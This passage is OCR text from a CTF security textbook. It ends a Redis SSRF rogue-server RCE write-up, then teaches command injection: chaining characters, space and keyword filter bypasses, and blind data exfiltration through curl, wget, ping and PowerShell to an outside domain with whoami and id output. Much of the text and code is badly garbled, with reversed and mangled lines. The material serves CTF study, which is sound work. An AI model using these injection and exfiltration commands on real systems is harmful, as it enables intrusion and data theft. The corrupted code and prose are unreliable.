was considered that Redis’ master-slave mode could be utilized (at the WCTF 2019
---
## Page 127
2.1 SSRF Vulnerabilities
111
roote527cc35574a3:/datanc-lvp 1234
s1s-la/|grepflag
1root
root
16 Dec1 83:28aeh9iephaeshi9eepha5itaekahhoh9o_flag
$ps-ef|grep redis
13
1Dec5？
00:17:88 redis-server 127.8.0.1:6379
78
00:08:09redis-cli
117
Fig, 2.38 Need to perform a power-up
Final, LCBC team members shared post-match that due to a new RCE exploit
(resulting from Redis master-slave replication) goes to the RCE to read the flag.
In order to cope with the problem of large read and write volumes, Redis provides
a master-slave model, which uses one Redis instance as the host for writing only, and
the other instances as slaves for reading only, since it has complete control of Redis
at this point, you can load a malicious extension by setting this machine as a slave to
your own VPS and backing it up on the host via FULLSYNC sync to the slave. You
can find exp about this attack on Github, e.g., https://github.com/n0bOdyCN/redis-
rogue-server.
Here, because of the trigger points, it is impossible to run the process provided by
exp above strictly.
First, set the VPS slave in the shell, then set dbfilename to exp.so, and perform the
first two steps in exp manually, as shown in Fig. 2.39.
Then, remove all the functions behind the load module and run exp on the VPS.
Finally, perform the rest of the steps manually on Redis and read the flags using the
functions provided by the extension, see Fig. 2.40.
te[rhest. rport., thest, 1pert]]
.9
127.8.8.1:4379 coig set f
iefelsetting arile
p.
.$ ST dee (SD_FLD*
127,8.8.1:437b
rogut-opl1
Infe(°Laading mote/e..*)
teegt23
reeote.shel1_oe(f*ra /(SD/A_Do_e_FILD*)
.de(°Ceeis SET eofilenas dunp,rd)°)
repat.clesel)
Fig, 2.39 Execution process
---
## Page 128
112
2 Advanced Web
ps=e（root)n*
beshi9eepha6ilaekahoho_flag
127.0.0.1:6379>
Fig, 2.40 Get flag
2.2Command Execution Vulnerabilities
Usually, when a developer uses some execution command function and does not
perform security checks on the data entered by the user, he can inject malicious
commands and put the whole server at risk. As a CTFer, command execution can be
used for the following purposes: (i) to obtain the flag directly: (i) to perform a
bounce shell and then enter the intranet door:; and (i) to take advantage of the
challenge master’'s lack of strict control over privileges and control over the chal-
lenge*s environment to prevent other team players from solving the challenge, thus
gaining an advantage in time.
In CTF, command execution generally occurs remotely, called Remote Com-
mand Exec (RCE), or RCE (Remote Code Exec). All RCEs in this section are
Remote Command Execs.
This section will describe common RCE vulnerabilies and ways to bypass the
WAF and then go through some classic topics to give the reader an understanding of
RCE topics in CTF.
2.2.1Principles ofCommandExecution andTestMethods
The following is an introduction to the basic principles of command injection,
including the problems that cmd.exe and bash have in parsing commands, the
similarities and differences in the execution of commands in different operating
systems, and how to test the CTF topic until the final flag is obtained.
2.2.1.1 Principle of Command Execution
-ond qeuaxo onooxo uogo suonsuny snogea satngue Suuues3oad snoueA u
 q   o   sd d  on s
malicious commands when the functions are called to execute commands without
filtering the input.
The following is an example of the system( ) function in PHP.
?php
[p.]aos = xTPS
---
## Page 129
2.2 Command Execution Vulnerabilities
113
for test
Fig, 2.41 Result
m|,0 · mlem
for test testasa\13a0n
Fig, 2.42 Result
system ("echo * . Sdir) : / / Execute the echo progran to output the
parameter string to the web page.
? >
The normal function of this code is to invoke the operating system's echo
program, take the string received from the d-parameter as input to the echo program,
and finally, the system( function retums the result of the echo program to the web
page, which is executed on the operating system with the command *echo for test.
The final page is displayed as "for test". See Fig. 2.41.
When you change the d-parameter to *for test %26%26 whoami", the web page
will show the result of the whoami program execution. whoami", see Fig. 2.42
Usually, special characters are URL-encoded to resolve ambiguous URL expres-
sions, and “%26" is the URL-encoding for “&". Why does injecting the “&&"
character cause command injection? Are there any other similar characters?
In various programming languages, “&&" is an expression of the AND syntax,
generally invoked in the following format.
(xpression 1) and (Expzession 2)
Returms true when both sides of the expression are true. A similar syntax is or,
which is usually denoted by *I. Note that they are inert; in the AND syntax, if the
result of the first expression is false, the second expression is not executed because it
is always false. In analogy to the or syntax, if the first expression is true, the second
expression will not be executed because it is always true.
So, command injection is the execution of a command specified by an attacker by
injecting special characters that change the intent of the original execution.
2.2.1.2 Command Execution Basics
Before testing, we need to understand the rules of cmd.exe and bash when parsing
commands and the similarities and differences between Windows and Linux.
---
## Page 130
114
qPM peouapy 
Fig, 2.43 Result
111 68 echo 222
222
1118%ech
111 *8^6 echo 222
0222
10
1. Escaped characters
The system cmd.exe and bash executable commands are capable of parsing many
special characters, and their existence makes BAT batch and bash scripting work
ejoods jo Suueau [epoads a anoau on juem non j! inq premsogjens auou
characters, you need to escape them, so the escaped character is to cancel the special
meaning of the character.
The Windows escape character is *^" and the Linux escape character is °V", see
Figs. 2.43 and 2.44, respectively. *which had a special meaning, is deprecated to be
output in the terminal.
2. Multiple command execution
In command injection, it is often necessary to inject multiple commands to extend
the damage, and the following are some of the strings that can constitute multiple
command execution: &&,II, %0a on Windows; &&, Il, , SO, ~, %0a, %Od on Linux.
Figures 2.45 and 2.46 show multiple command execution under Windows and
root@test:/tmp
文件（F）编辑（E查看（V）接索（S）终端（T）帮助H)
root@test:/tnp# echo 111 && echo 222
222
111
root@test:/tnp# echo 111 |8\& echo 222
11166echo 222
root@test:/tap#
Fig, 2.44 Result
or batch file
niaod...
Fig. 2.45 Result
---
## Page 131
2.2 Command Execution Vulnerabilities
115
Fig, 2.46 Result
22
etest:/tap# echo 111;echo 222
Fig, 2.47 Result
est:/
e（root)
Ld"
/tnot
#dva/:151810
Linux. Figure 2.45 shows *noexist Il echo pwnpwnpwn". The noexist program itself
does not exist, so it reports an error, but by injecting the l° character, it willexecute
even if it reports an error earlier, followed by the *echo pwnpwnpwn” command.
In the above example, “&&" and “ll' use conditional execution to execute
multiple commands, “%0a? and “ll" use conditional execution to execute multiple
commands, and “%0a” and Il' use conditional execution to execute multiple
commands. "%Od" is a new command that can be executed due to a line feed.
Also, note that in Linux, the contents of the strings “SO" or *"" wrapped in double-
quotes are executed as commands, but the strings included in single quotes are pure
strings and are not parsed, see Fig. 2.47.
3. Annotation marks
As with code comments, when properly utilized, command execution can make the
other characters following command the content of the comment, thus reducing
The comment symbol for Windows is **", which is used more often in BAT
batch scripts; the comment symbol for Linux is *#*, used more often in bash scripts.
2.2.1.3 Basie Tests of Command Execution
When faced with an unknown command injection, it is best to identify the command
injection point and denylist rules through various Fuzzes. The general command
format is as follows. 
2 - Program Paraneter Kame 2 Parameter Value 2
Program Name 1 - Progran Parameter Name 1 Paraneter Value 1 && Progran
Here is ping -nc 1 www.baidu.com to be an example.
---
## Page 132
116
2 Advanced Web
▪Program name: ping.
+Parameter: -nc.
Parameter values: 1 and www.baidu.com.
The string between the program name and the parameter values: the space
character.
+The entire order.
Parameter values are sometimes complex and may be partially controllable, wrapped
in double quotes, single quotes, and additional quotes need to be injected to escape.
For example, to construct a Fuzz list.
&& cux1 www. vps coms&
The * ,con* website is a vebsite of the United States of Anerica;
curl www.vps. con"
Then, by inserting the Fuzz list into the command point, you can check your own
server's weblogs to see a vulnerability.
2.2.2Command Execution Bypasses and Tricks
This section introduces the techniques for answering challenges on command
execution in CTF, which requires many factors to be controlled, such as the control
of privileges and the connection of the challenges. However, command execution is
sod isa o ssedq o sem [ngs uao an aup pue pemogrens pue eing
2.2.2.1Missing Spaces
In some code audits, spaces are often prohibited or filtered to null, which is explained
below. For example, for the following PHP code.
";
? >
The command “echo pwnpwn" fails when you filter the space in the cmd
parameter to null. See Fig. 2.48.
However, you can use more than just spaces in the command (the URL is encoded
Uo os pue 20% 90% (07%, m
 ueae aem 60%,  sg 6t  as s dq  m zzn
“echo%09pwnpwnpwn", and you will find that the space restriction can be
bypassed. See Fig. 2.50.
---
## Page 133
2.2 Com
and Execution Vulnerabilities
117
lcem
OD: echoprmpmpm
Fig, 2.48 Result
1939
Date: Tue, 14 May 2019 05:45:23 GNT
HTTP/L1 200-OK
er: Apache/2.4.23 (Win32 OpenSSL/1.0.8j PHP/5.538
ontent-Length: 34
red-By: PHP/5.5.38
ent-Type: text/html
Fig, 2.49 Fuzz with the burp suite to bypass
e
QD:
echo
Fig, 2.50 Bypass result
---
## Page 134
118
qPM peouapy 
nFilesx
111
>echexProgranFiles1"18,1x111
Fig, 2.51 Result
This is just one of the general ways to de-Fuzz unknown cases. If invisible
Suns Aq saeds 1o ose ueo nof pepqesip am P0%, 1o _e0%, se qons suaoeeq
capture.
1. Under Windows
For example, the following command.
$ProgzamFi1es : ~10, 1
Therefore, the above command starts from the tenth and gets a string, i.e., a space,
as shown in Fig. 2.51.
2. Under Linux
There are also ways to bypass spaces in Linux.
Valid for bash, invalid for zsh and dash.
{cmd, axgs}
When reading a file.
cat<>flag
SIFSS9: Linux has an IFS (Internal Field Separator) environment variable, an
intermal field separator that defines the command spacing character of the bash shell,
usually a space. Note that when only SIFS is injected, i.e., the result of the executed
command is echoSIFSaaa, you can see that the parsed SIFSaaa variable does not
exist, so you need the separator to avoid it, usually use *$9", *$9" indicates the 9th
parameter of the current system shell process, usually an empty string. That is, the
final successful execution of the command is “echoSIFSS9aa"
q soed auos u 'so {Sl)s., Susn 1oofu o1 aqissod ose s! 1 *sno JO
changing the IFS variable to a comma, i.e., “;IFS=,;”", see Fig. 2.52.
---
## Page 135
2.2 Command Execution Vulnerabilities
119
Fig, 2.52 Result
root@ubuntu:/# echoSIFS$9aaaa
root@ubuntu:/# (echo,aaaa)
aaaa
root@ubuntu/#
aaaa
2.2.2.2 Blacklist Keywords
In CTF competitions, you may sometimes encounter deny-listed keywords, such as
cat, flag, and other strings, which can be bypassed in the following way.
1. Splicing with variables
Linux: a=c;b=at ; c=he;d=11o;SaSb S{c}$(α)
The a variable is c, the b variable is at, and finally SaSb is cat. c variable is he, d
variable is llo, and finally S{c}${d) is hello, so the command executed here is *cat
hello.
2. Use wildcards
In wildcards, "? " stands for any string, and "*" stands for any string.
cat /tm?/fl+
(Windows)
(Linux)
type fla *
Sussn Aq aaoqe paaaupe s! stuns pas-Auap jo Suissedq au °aas ueo noA sy
the cat and type commands combined with wildcards.
3. Borrowing existing strings
o suns mouoq ueo no ssus aoo pue  2, se qons suns atqesp no J
other files and use the substr() function to truncate a specific character. The result of
the bypass execution is shown in Fig. 2.53.
rootgubuntu:/tnp/tests cat lenon.php
1,1011a4. 
1 1 (dqduou I=n e)s sqns Jdxa, oqsa saa/dun/:ngunqn8oc
otgubuntu:/tnp/test# echo *expr substr S(ack NR==1 lenon-php) 2 1
.I z (dyduowe (**gs xpe)s 1sqns adxe, oy>a nsea/dun/ingungn81
1s3/dun/:naunqn81c
Fig, 2.53 Result
---
## Page 136
120
2 Advanced Web
2.2.2.3Execution Without Echoes
In CTF, we often encounter a situation where the results of a command execution are
not displayed on the web page.
Before we start, we recommend building a VTest platform htps://github.com/
opensec-cn/vtest for testing. After building it, start testing it with the following
test code.
exec (S_GET['cnd′]) ;
1. HTTP channels
Assuming your domain name is example.com, here is an example of getting
permission for the current user. 
Under Windows, data can currently be exported only through relatively complex
commands (if Windows supports Linux commands in the future, it will be easier to
export data).
for /F $x in ['echo he11o′) do start http : //example. com/httplog/kx
The result of echo hello execution is saved in the %x variable with the for
command and then spliced into the URL.
After the above command is executed, the system’s default browser will be called
to open and access the specified website, and eventually, the results of the echo hello
command will be available on the platform, see Fig. 2.54.
However, the drawback is that the browser does not close when you call it, and
there is a truncation problem when special characters or spaces are encountered, so
you can borrow Powershell for extraneous data. In Powershell 2.0, execute the
following command.
for /F $x in ('echo he11o′) do powershe11 Sa = [System. Convert] : :
Sb = New-Object
ToBase64Stzing ( [Systen.Text . Encoding] : :UTF8 . GetBytes ('4x*11 :
System.Net . WebClient ;Sb .DowmloadString ( 'http: / /example com/
 {es+/6odu
Here the result of echo hello is Base64 encoded and then sent via web request
Mleeden
Mp
Fig. 2.54 Result
---
## Page 137
2.2 Command Execution Vulnerabilities
121
URL
Fig, 2.55 Get lag
Under Linux, it is extremely convenient to transfer data due to pipes, etc., and
usually uses programs such as curl, wget, etc., to take out data. Example.
cur1 exanple . con/ ^ whoami ^
wget example.com/$ (id| base64)
In the above example, we use " and “$O° in multiple commands to splice the
strings and finally request them via curl, wget, etc., to achieve data take-out, see
Fig. 2.55.
2. DNS channels
Often we test DNS outbound data by pinging, with parameters that differ somewhat
between Windows and Linux. For example,limiting the number of ping times is “-n"
in Windows but "-c" in Linux. For compatibility purposes, it can be used in
Under Linux.
ping -c 1 ^vhoami ~ .examp1e .com
In Windows, it is relatively complex, mainly using the delims command for
segmentation processing, and finally splicing to the domain name prefix, and then
using the ping program for take-out.
 Get computer name.